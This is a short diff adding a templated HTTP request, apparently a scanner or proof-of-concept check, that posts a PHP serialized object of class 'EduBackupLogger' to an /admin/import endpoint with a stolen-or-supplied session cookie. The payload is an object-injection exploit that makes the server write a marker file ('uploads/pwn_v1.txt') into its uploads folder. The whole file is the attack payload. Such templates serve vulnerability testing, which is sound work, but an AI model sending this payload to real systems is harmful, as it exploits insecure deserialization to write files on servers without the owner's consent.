@@ -1,0 +1,5 @@
+POST {{TARGET}}/admin/import HTTP/1.1
+Content-Type: application/json
+Cookie: {{SESSION}}
+
+{"{{IMPORT_PARAM}}":"O:15:\"EduBackupLogger\":2:{s:7:\"logFile\";s:18:\"uploads/pwn_v1.txt\";s:3:\"msg\";s:18:\"VULN_CONFIRMED_DV1\";}"}
